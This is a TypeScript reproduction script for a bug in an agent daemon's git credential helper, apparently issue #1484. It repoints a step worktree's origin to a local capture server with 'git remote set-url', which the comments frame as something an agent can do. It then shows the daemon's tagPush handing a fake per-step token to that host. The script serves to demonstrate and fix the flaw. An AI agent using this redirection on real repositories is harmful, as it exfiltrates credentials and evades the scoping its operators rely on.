// Reproduction: the per-step credential helper answers for whatever host origin points at.
// A step worktree's origin is repointed (what an agent can do with `git remote set-url`),
// then the daemon's own tagPush runs with a fake per-step token.
import { execFileSync } from 'node:child_process';
import { createServer } from 'node:http';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gitPrim } from '../../../apps/daemon/src/git.ts';

// Bound to the host the claim says the repo lives on (#1484); old code ignores `url`.
const CRED = { username: 'x-access-token', password: 'ghs_FAKE_STEP_TOKEN_0000', url: 'https://github.com/o/r.git' };
const seen: string[] = [];
const server = createServer((req, res) => {
  const auth = req.headers.authorization;
  if (!auth) {
    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="other-host"' });
    res.end();
    return;
  }
  seen.push(Buffer.from(auth.replace(/^Basic /, ''), 'base64').toString('utf8'));
  res.writeHead(403);
  res.end();
});
await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
const port = (server.address() as { port: number }).port;

const root = mkdtempSync(join(tmpdir(), 'repro-1484-'));
const bare = join(root, 'real.git');
const wt = join(root, 'wt');
const g = (args: string[], cwd?: string) => execFileSync('git', args, { cwd, stdio: 'pipe' }).toString().trim();
g(['init', '--bare', '-b', 'main', bare]);
g(['clone', bare, wt]);
writeFileSync(join(wt, 'a.txt'), 'a\n');
g(['-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qam', 'seed', '--allow-empty'], wt);
g(['-c', 'user.name=t', '-c', 'user.email=t@t', 'tag', '-a', 'v1', '-m', 'v1'], wt);

console.log(`credential bound to: ${CRED.url}`);
console.log(`origin before: ${g(['remote', 'get-url', 'origin'], wt)}`);
g(['remote', 'set-url', 'origin', `http://127.0.0.1:${port}/elsewhere.git`], wt);
console.log(`origin after the agent's set-url: ${g(['remote', 'get-url', 'origin'], wt)}`);
try {
  await gitPrim.tagPush(wt, 'v1', CRED);
} catch (e) {
  console.log(`tagPush failed: ${String(e).split("\n")[0]}`);
}
console.log(`credentials the other host received: ${JSON.stringify(seen)}`);
server.close();
